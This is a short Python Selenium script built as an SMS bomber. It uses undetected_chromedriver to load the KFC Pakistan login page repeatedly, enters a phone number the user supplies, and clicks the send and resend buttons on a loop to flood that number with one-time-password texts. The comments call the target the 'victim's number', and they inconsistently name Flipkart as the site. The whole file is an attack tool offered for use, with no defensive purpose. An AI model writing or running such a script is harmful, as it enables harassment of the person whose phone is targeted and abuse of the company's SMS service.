import undetected_chromedriver as uc
import time
from selenium.webdriver.common.by import By

# create instance of Chrome webdriver
browser = uc.Chrome()

# set the frequency of sms which is approx maximum to 10 per 24 days
frequency = 10

# target mobile number, change it to victim's number and
# also ensure that it's registered on flipkart
mobile_number =input("Enter Number _> ")

for i in range(frequency):
    browser.get('https://www.kfcpakistan.com/login')

    # find the element where we have to
    # enter the number using the class name
    test=browser.find_element(By.XPATH,'//*[@id="outlined-number"]')
    test.click()
    test.send_keys(mobile_number)
    # set the interval to send each sms
    browser.find_element(By.XPATH,'//*[@id="root"]/div[2]/div[2]/div[2]/div[2]/div/div[4]/button').click()
    for x in range(0,1000):
        time.sleep(20)
        browser.find_element(By.XPATH,'/html/body/div[3]/div/div/div[3]/div[1]/div/div[2]/h6[2]').click()
        print(i)


# Close the browser
browser.quit()